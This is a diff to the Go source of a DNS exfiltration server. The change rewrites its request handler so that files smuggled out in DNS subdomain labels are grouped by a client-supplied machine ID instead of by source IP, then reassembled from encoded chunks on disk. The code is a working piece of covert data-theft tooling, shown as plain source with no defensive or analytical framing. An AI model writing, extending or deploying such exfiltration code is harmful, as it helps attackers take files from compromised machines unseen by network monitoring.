@@ -68,17 +68,17 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 		request.Unpack(buf)
 		name := request.Question[0].Name
 		subdomains := strings.Split(name, nameServer)[0]
-		msgType, msg := func() (string, string) {
-			x := strings.SplitN(subdomains, ".", 2)
-			return x[0], x[1]
+		msgType, machineId, msg := func() (string, string, string) {
+			x := strings.SplitN(subdomains, ".", 3)
+			return x[0], x[1], x[2]
 		}()
 		data := strings.ReplaceAll(msg, ".", "")
 
-		clientDir := path.Join(EXFILTRATION_DIR, clientAddr.IP.String())
+		clientDir := path.Join(EXFILTRATION_DIR, machineId)
 
 		// Initialise the inner map if uninitialised.
-		if _, ok := ex.openFiles[clientAddr.IP.String()]; !ok {
-			ex.openFiles[clientAddr.IP.String()] = make(map[string]*os.File)
+		if _, ok := ex.openFiles[machineId]; !ok {
+			ex.openFiles[machineId] = make(map[string]*os.File)
 		}
 
 		switch msgType {
@@ -86,11 +86,11 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 			fileutils.CreateDirIfNotExists(clientDir)
 			filename := getFilePathFromEncodedFilename(clientDir, data)
 			file := fileutils.CreateFileIfNotExists(filename)
-			ex.openFiles[clientAddr.IP.String()][filename] = file
+			ex.openFiles[machineId][filename] = file
 		case DNS_FILE_END.String():
 			filename := getFilePathFromEncodedFilename(clientDir, data)
-			file := ex.openFiles[clientAddr.IP.String()][filename]
-			decodedData := decodeFromModifiedBase64(string(ex.unprocessedData[clientAddr.IP.String()]))
+			file := ex.openFiles[machineId][filename]
+			decodedData := decodeFromModifiedBase64(string(ex.unprocessedData[machineId]))
 			_, err := file.Write(decodedData)
 			if err != nil {
 				log.Fatalln(err)
@@ -100,7 +100,7 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 				log.Fatalln(err)
 			}
 		case DNS_FILE_DATA.String():
-			ex.unprocessedData[clientAddr.IP.String()] = append(ex.unprocessedData[clientAddr.IP.String()], data...)
+			ex.unprocessedData[machineId] = append(ex.unprocessedData[machineId], data...)
 		default:
 			log.Printf("Unknown message type: '%s'", msgType)
 		}
